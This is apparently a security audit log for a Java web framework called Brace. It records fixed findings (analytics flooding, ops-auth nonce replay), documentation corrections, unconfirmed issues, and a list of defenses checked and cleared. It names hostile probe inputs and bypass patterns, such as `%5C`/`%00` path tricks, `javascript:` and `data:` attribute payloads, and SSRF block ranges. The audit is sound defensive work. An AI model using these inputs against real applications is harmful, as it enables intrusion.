- [x] **L16: Analytics growth is rate-bounded only; ops nonce cache gaps**, `Analytics.java:81, 315-319`, `OpsHandler.java:129, 1114-1120`
  - The 20,000-row buffer per 10 s flush allows about 2,000 inserted rows per second, kept 35
    days, with no per-visitor or per-day cap; any client sending `Sec-Fetch-Mode: navigate` and
    a browser User-Agent counts.
  - The ops-auth nonce cache is lost on restart (a captured request replays within ±30 s after
    a deploy), shares one fail-closed 100k budget across all keys (any key holder can block
    other operators' logins), and sweeps the whole map on every call.
  - **Fix.** A per-visitor cap per flush window and a daily row budget; reject timestamps before
    process start, give each key its own quota, sweep on a timer.
  - **Model: Sonnet 5.5.** Deferrable.
  - **Final review fixes** (`fix(security): L16 final review fixes`). The per-visitor cap did
    nothing against one IP rotating `User-Agent` (one IP stored 20,000 of 25,000 views per
    window), and the daily row budget was a blinding primitive (about 250 s at 2,000 req/s spent
    it; legitimate views then stored 0 rows until midnight, shown only as one WARN and "Dropped").
    Now: a cap keyed on the client address alone (`RateLimiter.ipBucket`, IPv6 by /64) per flush
    window, `maxViewsPerIpPerFlush`, default 300 (1.5% of the 20,000-view buffer); each address
    may use at most `maxDailyRowsPerIp` of the daily budget, default 2% (10,000 of 500,000),
    tallied for up to 50,000 addresses a day; when the budget is reached the time and the views
    refused since are recorded and shown on `/ops/analytics` ("Row budget reached at HH:MM, N
    views not stored", through `esc()`) and in the JSON report (`rowBudget`). Totals stay honest
    (refused views under "Not counted: dropped"). Tests in `AnalyticsCapsTest`.
  - **Final review fixes** (ops auth). L-B: the start-time floor did not stop a replay after a
      restart when the client's clock ran ahead. L-C: it ran before the signature was verified
      and refused clients whose clocks ran slightly behind. Now: with a database, accepted
      nonces are recorded in `brace_counters` (fleet-wide, survives restarts; no migration) and
      nothing is refused after a start; without one, or while it is down, sign-ins timestamped
      earlier than 30 s after the start are refused, with a message naming the restart and the
      clock (off in dev mode and the test harness). All replay checks follow the signature and
      origin checks. The nonce cache evicts from an expiry-ordered queue, at most 64 entries a
      call, instead of sweeping the map; each key's quota is sized so all quotas fit under the
      cap. Tests in `OpsAuthFinalReviewTest`, `OpsNoncePostgresIT`. Residual, documented: with
      no database, a request accepted by one live instance can be replayed against another
      within its window.

## Documentation errors

Fixed in the commit of the finding named, or the closeout docs commit.

- [x] `docs/SECURITY.md:1208-1209`: the `"(none)"` bucket claim (M4).
- [x] `docs/SECURITY.md:1187, 1190`: `before("/api", …)` limits only the literal `/api` (M4).
- [x] `docs/SECURITY.md:707-716`: recommends `::ffff:10.0.0.0/104`, which throws at startup
  ("Prefix length must be 0..32"); the mapped form already matches the IPv4 CIDR. Remove it.
- [x] `docs/SECURITY.md:1389`: says ops auth v1 "is accepted for one release"; it is removed.
  (Closeout docs commit.)
- [x] `docs/SECURITY.md:348-354` and the `@template` "Not covered" note (L7).
- [x] Stale comments: `Brace.java:1804-1805` (dashboard "embeds a live bearer token"),
  `OpsToken` class doc ("same as Brace session cookies"), `Session.java:382-383` (legacy cookies
  without `_exp`), `Request.java:493-495` (Jetty joins repeated headers), `RateLimiter.java:477`.
  (The last two in Track C; the first three in the closeout docs commit.)
- [x] Found at closeout: three sentences in `docs/SECURITY.md` and `BRACE-AGENTS.md` about
  script-body escaping had lost their `\uXXXX` escapes when written and read "`<` written as
  `<`". Restored.

## Not confirmed

- **`%00` in a path segment.** Whether Jetty 12.0.40 passes it to Brace was not settled (one
  probe saw a 400 for `%00` in a path). It matters for the path-parameter variant of M5 and for
  an uncaught `InvalidPathException` at `BraceHandler.java:1365`.
- **Over-long HTTP method.** Whether a request with a method token over about 250 characters
  reaches the generic catch and overflows `ops_errors.route` was not traced (M5).
- **Request-derived control characters in `brace errors`.** The server-controlled case is
  confirmed (L11); a `%1b` request parameter was not traced through to a stored message.
- **Windows.** `hasHiddenSegment` splits on `/` only, so `sub%5C.env` would pass the dotfile
  check if Jetty admits `%5C`.
- **Cloudflare preset.** Whether a Worker on another account can present a forged
  `X-Forwarded-For` to an origin trusting `TrustedProxies.cloudflare()`.
- **Connection caps.** There is no cap on concurrent SSE streams or WebSocket connections (one
  virtual thread each); exhaustion was not measured.
- **Statement timeouts.** No statement or Hikari timeouts are configured anywhere. Noted, not
  assessed.
- **Analytics referrer host.** `Analytics.source()` does not strip control characters as
  `storedPath` does; obs-text bytes 0x80-0x9F may reach `brace analytics` terminal output.
- **`ops.key` from the committed `.brace`.** A repo can point the CLI at another project's key
  file by path. The signature stays bound to the repo-chosen origin and nothing leaks; reading
  `ops.key` only from `.brace.local` or flags would be a hardening.
- **Payload confidentiality on the WebSocket bus.** Payloads are signed, not encrypted; anyone
  who can `LISTEN` on the database and learns the channel name reads broadcasts. Acknowledged in
  the class doc.
- **JTE 3.2.1 drops template text before a template's first comment.** In the shape documented
  in `docs/SECURITY.md` (Cross-Site Scripting, "Comments in a script or style": the first comment comes
  before the first `${...}` or `@if`, and the text from it to the next `${...}` has a `<`
  directly followed by a letter with no `>` after it), JTE drops all the template text before
  the comment, the `<script>` tag included. Brace escapes the data in the resulting stray tag
  whole, so the result is a broken page, not an injection. An upstream bug; not reported
  upstream yet.
- **`brace logs` exits 0 after an HTTP error.** Without `--follow`, a non-200 response from
  `/ops/logs` is printed as `HTTP <status>: ...` and the command still exits 0
  (`CliCommands.renderLogsOnce` returns 0, which `logs` does not tell apart from "no entries"),
  so a script or agent that checks the exit code reads a failure as success. `brace errors` and
  `brace status` exit 2 in the same case.
- **Test-suite port collisions.** Full-suite runs had one test fail now and then with a response
  that did not come from Brace (a `404 page not found`, an MCP server's 401, a garbled status
  line), passing on rerun. Reproduced on macOS: an app on `.port(0)` listens on the wildcard
  address, the OS can hand it a port another local process holds on `127.0.0.1`, `start()`
  succeeds, and the test's connection to `127.0.0.1` or `localhost` reaches the other process.
  `Brace.test()` now binds `127.0.0.1`, which makes such a collision fail at `start()`; the
  roughly 125 tests that call `Brace.app().port(0)` directly still bind the wildcard. The same
  behaviour in production (a process binding `127.0.0.1:<app port>` with `SO_REUSEADDR` takes
  the app's loopback traffic) is reported separately for a decision.
- **`Result.headers()` exposes the mutable header map.** It returns the `TreeMap` itself, so
  `result.headers().put(name, value)` bypasses `Result.header(...)`'s header-name validation
  (`requireHeaderName`) and its routing of `Set-Cookie` into the separate cookie list.

### Raised during the fix phase, not done

These came out of the fixes and their independent reviews. None is a known bypass; each is
either a hardening option, a limitation, or something that could not be verified.

- **Build commands on a hostile checkout.** `brace compile` and `brace test` create and write
  `target/classes` and `target/test-classes` through a committed `target` symlink
  (`BuildCommands.java`), and print compiler and test output raw. Those commands run the
  project's own code by design, so this was left out of L11. Not verified by running.
- **Template tokenizer: `<title>` and `<textarea>`.** Their bodies are read as markup, because
  `<title>` inside `<svg>` really is markup. JTE refuses unbalanced tags there, which limits the
  effect to `@raw`/`$unsafe` text; the cost is at worst attribute-escaping data in text that
  looks like a tag.
- **Full `\uXXXX` escaping for every script body.** In SVG the tokenizer does not model, a
  script body with a template-written `a<b` before a string could still let a quote end a
  pseudo-attribute. Writing all script-body data with `\uXXXX` escapes for quotes too would close
  it, and would also fix an existing non-security bug: JTE's script escapes (`\'`, `\-`) are not
  valid JSON, so a value with an apostrophe or hyphen breaks
  `<script type="application/json">` blocks. Not done because it changes all script-body output.
  (Since done in the final review round: decision F5 in the fix plan.)
- **Over-redaction by `isSecretShaped`.** A dated slug (`2024-black-friday-sale`), a dash-joined
  hex list, a hash of 16 or more hex characters, and a free-form header whose whole value is an
  absolute path containing a digit are redacted in error records, because they look like a
  grouped recovery code or a secret. Unchanged by M6 and documented in `docs/SECURITY.md`;
  narrowing it means changing the rule for paths and logs too.
- **Rate-limiter flush on the request thread.** The shared-counter flush still runs on the
  request thread that wins it. It is now chunked, bisects on a bad key and stops after 2 s, but
  it was not moved off-thread because the same request reads the result for its own decision.
- **A test JVM hang inside `Brace.stop()`.** One fix agent saw `CliCheckTest` hang in Jetty's
  `server.stop()`; it could not be reproduced in 800 iterations of the same scenario. The
  likelier cause is a server left running by a test (the `stopped` flag bug, now fixed, did
  that). Several unrelated test classes also failed once and passed on rerun while four suites
  ran on one machine; a serial run on the merged branch was clean.
- **`csrf-htmx.js` was not executed in a browser.** L8's test checks the script's text only.
- **Page-cache poisoning by inputs the framework cannot see.** The dev and test check flags
  undeclared reads through `Request`; a handler that depends on global state or reads the raw
  Jetty request is not detected.
- **`deletePrefix` over-deletion.** For a prefix that has to be cut (control character, the hash
  marker, over 128 characters) some unrelated hashed keys sharing the cut prefix are still
  cleared. Stated in the Javadoc.

## Checked and cleared

- **Route access.** `resolveAccess` covers HTTP and WebSocket routes and refuses unmarked ones.
  Access is bound to the `Route`, so the HEAD fallback, trailing-slash and encoded-literal
  variants run the same list. Order: plain `before`, Access, session middleware, cross-site
  check, body read, CSRF token, handler. A page-cache hit can never precede the access check.
- **WebSocket upgrade.** Runs plain `before`, the Origin check, then route Access with a
  validator-checked session.
- **CSRF.** All four mutating verbs on every `csrfRequired` route; 32-byte tokens; masked
  compare is constant-time and length-checked; accepted only from a `_csrf` field or
  `X-CSRF-Token`; no method override; `Origin: null` refused; ops POST exemptions carry the ops
  Access.
- **Open redirect and header injection.** `Redirect.toLocal` rejects `//`, `/\`, backslashes and
  control characters; framework redirects use fixed targets; `Result.cookie` validates name,
  value and path; `Result.contentDisposition` handles quotes, CRLF and RFC 5987.
- **Session crypto.** 96-bit random nonce; PBKDF2-SHA256, 100k iterations, 256-bit key; `_exp`
  and `_abs` inside the ciphertext; decrypt failure returns an empty session with no oracle;
  `Secure` and `__Host-` resolution take forwarded headers only from trusted peers; a tossed
  `brace_session` is ignored where the prefix applies; the validator runs on every decode path.
- **Ops.** HMAC tokens with constant-time compare, `typ` enforced per channel, scope capped at
  the key's current ceiling; a READ token cannot reach a CONTROL route; cookie-authenticated
  mutations require same-origin; no endpoint takes a file path, class name or duration; the
  profiler has no dump or download; the v3 signature is bound to the origin the request goes
  to; the token cache is per origin under `~/.brace`, read without following links.
- **Dashboards.** Every request-derived string in `OpsDashboard`/`AnalyticsDashboard` goes
  through `esc()`; `ops.js` uses no `innerHTML`.
- **Template attributes.** Leading control characters, `java\nscript:`, mixed case,
  `vbscript:`, `data:text/…`, `data:image/svg+xml` on `src`, `${a}:${b}` with the hold
  established, `xlink:href`, MathML and SVG animation targets, `formaction`, `@template` inside
  `href`/`title`/`onclick`: all blocked. Unquoted attributes and `${}` in attribute names are
  compile errors.
- **htmx.** Bundled 2.0.10 with `selfRequestsOnly:true`; the scaffold ships
  `SecurityHeaders.strict()` plus `allowEval:false, allowScriptTags:false`.
- **Static files and uploads.** `..`, `%2e%2e`, `%2F`, absolute paths, symlink escapes,
  directories and dotfiles at any depth return 404. UNTRUSTED mode takes the type from an
  allowlist, serves only raster images inline, and re-enforces `sandbox`, `nosniff` and
  attachment at write time, on 206 and HEAD too. `safeFilename` and `confine` hold. Jetty's
  `maxParts` defaults to 1000.
- **Dynamic SQL.** Every concatenation site was enumerated: entity names from `Class` objects;
  field names through `requireValidFieldIdentifier`; generated placeholder lists; `Sort.from`
  allowlists; constant predicates in `JobPoller`, `ErrorStore` and `Analytics`. The `?` to `?N`
  converter has no desynchronization that silently rebinds a value. `findOwnedOr404` is one
  query constrained by owner, and a null id or owner is a 404.
- **LISTEN/NOTIFY.** The channel is `brace_ws_` plus 16 hex characters of a SHA-256, validated
  against `[a-z0-9_]{1,63}` and quoted; 25 bytes, so no truncation or case folding.
  `pg_notify(?, ?)` is bound. Messages carry an HMAC checked before parsing, with a 60 s
  window, nonce cache and start-up floor.
- **Jobs and deserialization.** `Class.forName(name, false, …)` with a `DurableJob`
  assignability check before instantiation; the class name is written only from
  `job.getClass().getName()`; no default typing, `@JsonTypeInfo` or `ObjectInputStream`.
- **Database lifecycle.** A `Database` is created and closed per request, never cached; the
  framework issues no `SET` or role changes on pooled connections; `QueryTaint` state lives on
  the per-request `Database`, not a thread-local.
- **`Http` guard.** Blocks 0/8, 10/8, 100.64/10, 127/8, 169.254/16, 172.16/12, 192.0.0/24,
  192.0.2/24, 192.168/16, 198.18/15, 224/4, 240/4, and for IPv6 everything outside 2000::/3,
  with IPv4-mapped, NAT64 and 6to4 judged by the embedded IPv4 and Teredo and documentation
  ranges blocked. Decimal, octal, hex and short IPv4 forms, trailing dots, userinfo and
  non-http schemes are refused. All resolved addresses are checked, before the send and again
  after headers. Redirects are never followed. `.trusted()` is per request.
- **Storage.** Keys cannot alter the query, host or bucket; no presigned-URL API exists; upload
  content type comes from an allowlist on the key; the secret key is never logged.
- **Process spawns.** `git config`, `open`/`xdg-open`/`rundll32` with a validated URL, and the
  build commands (`java`, `mvn`) that run project code by design. No `sh -c`, `bash -c` or
  `Runtime.exec`.
- **Launcher and install.** No `eval`, `source` or backticks on project data; the pin is
  regex-validated and printed with `%q`; `.brace`, `application.conf` and `.mvn/` are never
  read by `bin/brace`; downloads are https-only including redirects; `Toolchains.unzip` guards
  against zip-slip and stages in a temp directory.
- **Scaffold.** Name restricted to `[A-Za-z0-9_-]+`; a 32-byte `SecureRandom` session secret in
  an owner-only, ignored `application.conf`; compose with no default passwords and Postgres
  unpublished; non-root, digest-pinned image in prod mode.
- **CI.** `pull_request` (not `_target`), `contents: read`, actions pinned by SHA, no event
  data in `run:`; the OSV binary is sha256-pinned and the gate fails closed.
- **Mail headers.** CRLF in subject or display name is folded, not injected; CRLF in an address
  is rejected; hostname verification is on.
